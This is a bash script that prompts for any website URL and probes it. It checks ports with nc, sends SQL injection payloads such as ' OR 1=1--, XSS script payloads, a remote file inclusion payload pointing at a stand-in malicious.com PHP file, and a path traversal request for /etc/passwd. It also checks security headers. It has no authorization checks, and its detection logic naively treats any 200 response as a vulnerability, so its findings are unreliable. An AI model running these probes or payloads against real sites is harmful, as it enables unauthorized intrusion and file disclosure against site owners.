#!/bin/bash

# Function to check for open ports on the target
# Don't try to copy this function. It's unethical and educational purposes only.
check_ports() {
    echo "Checking open ports on $1..."
    for port in 80 443 8080 8443; do
        nc -zv $1 $port &>/dev/null
        if [ $? -eq 0 ]; then
            echo "Port $port is open."
        else
            echo "Port $port is closed."
        fi
    done
}

# Function to test for SQL Injection vulnerability
test_sql_injection() {
    echo "Testing for SQL Injection vulnerability on $1..."
    payloads=("'%20OR%201=1--" "'%20OR%20'a'='a" "'%20OR%201=1#")
    for payload in "${payloads[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$1?$2=$payload")
        if [ "$response" == "200" ]; then
            echo "Potential SQL injection vulnerability found with payload: $payload"
        else
            echo "No SQL injection vulnerability found with payload: $payload"
        fi
    done
}

# Function to test for XSS vulnerability
test_xss() {
    echo "Testing for XSS (Cross-Site Scripting) vulnerability on $1..."
    payloads=("<script>alert('XSS')</script>" "<img src='x' onerror='alert(1)'>")
    for payload in "${payloads[@]}"; do
        response=$(curl -s "$1?$2=$payload")
        if [[ "$response" == *"$payload"* ]]; then
            echo "Potential XSS vulnerability found with payload: $payload"
        else
            echo "No XSS vulnerability found with payload: $payload"
        fi
    done
}

# Function to test for Remote File Inclusion (RFI)
test_rfi() {
    echo "Testing for Remote File Inclusion (RFI) vulnerability on $1..."
    payloads=("http://malicious.com/malicious_file.php" "../../../../../../etc/passwd")
    for payload in "${payloads[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$1?$2=$payload")
        if [ "$response" == "200" ]; then
            echo "Potential RFI vulnerability found with payload: $payload"
        else
            echo "No RFI vulnerability found with payload: $payload"
        fi
    done
}

# Function to check for security headers
check_security_headers() {
    echo "Checking security headers on $1..."
    headers=$(curl -s -I "$1" | grep -i -E 'x-frame-options|x-content-type-options|strict-transport-security|content-security-policy|x-xss-protection')
    if [ -z "$headers" ]; then
        echo "No security headers found!"
    else
        echo "Found security headers:"
        echo "$headers"
    fi
}

# Main function
scan_website() {
    # Prompt user to enter the website URL
    echo "Please enter the website URL (including http:// or https://):"
    read WEBSITE_URL

    if [ -z "$WEBSITE_URL" ]; then
        echo "Usage: Please provide a valid URL."
        exit 1
    fi

    DOMAIN=$(echo $WEBSITE_URL | sed -E 's|https?://(www\.)?([^/]+).*|\2|')

    echo "Scanning website: $WEBSITE_URL"
    echo "-----------------------------------------------------"

    # Call the functions
    check_ports $DOMAIN
    test_sql_injection $WEBSITE_URL "id"
    test_xss $WEBSITE_URL "search"  # assuming search is a common parameter
    test_rfi $WEBSITE_URL "file"    # assuming file is a parameter to test for RFI
    check_security_headers $WEBSITE_URL

    echo "-----------------------------------------------------"
    echo "Scan completed for $WEBSITE_URL"
}

# Run the scan
scan_website
